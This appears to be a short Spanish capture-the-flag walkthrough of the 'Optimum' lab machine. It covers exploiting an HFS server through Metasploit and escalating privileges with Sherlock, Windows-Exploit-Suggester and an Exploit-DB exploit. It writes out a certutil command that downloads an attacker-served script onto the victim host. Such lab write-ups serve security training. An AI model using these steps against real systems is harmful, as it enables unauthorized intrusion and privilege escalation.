# 7 - Optimum - Manual escalation \(win\_med\)

Solo teniamos el puerto 80 abierto con este modulo. Se llama servidor de transferencia HFS

![](../../.gitbook/assets/imagen%20%28578%29.png)

## Exploit

Primer resultado de metasploit nos lleva a una shell de usuario

![](../../.gitbook/assets/imagen%20%28576%29.png)

### Suggestor for post exploit

Utilizaremos un suggestor para que nos ayude a escalar

![](../../.gitbook/assets/imagen%20%28571%29.png)

![](../../.gitbook/assets/imagen%20%28574%29.png)

### Manual privilege scalation

{% embed url="https://github.com/rasta-mouse/Sherlock" %}

De ahi sacamos el script ps1, luego lo levantamos en un python http simple y lo llevamos a la otra consola de windows que queremos escalar

![](../../.gitbook/assets/imagen%20%28575%29.png)

```text
certutil -urlcache -f ip/archivo.ps1 nombreacrhivo 
```

### Desde la vulnerable

![](../../.gitbook/assets/imagen%20%28570%29.png)

### Windwos exploit suggester

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}

Aqui en el medio lo que hacemos es conseguir la sys info y ponerla en un archivo. Para eso desde consola simplemente ponemos **systeminfo** y ponerla en un archivo de texto.

```text
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```

La database de python se obtiene luego de hacer el update 

![](../../.gitbook/assets/imagen%20%28572%29.png)

Tras eso nos sguiere vulnerabilidades. Llegamos a una ejecutable desde este codigo

{% embed url="https://www.exploit-db.com/exploits/41020" %}

Con este lo bajamos, transferimos con lo mencionado del simple http de python y ejecutamos.

![](../../.gitbook/assets/imagen%20%28577%29.png)

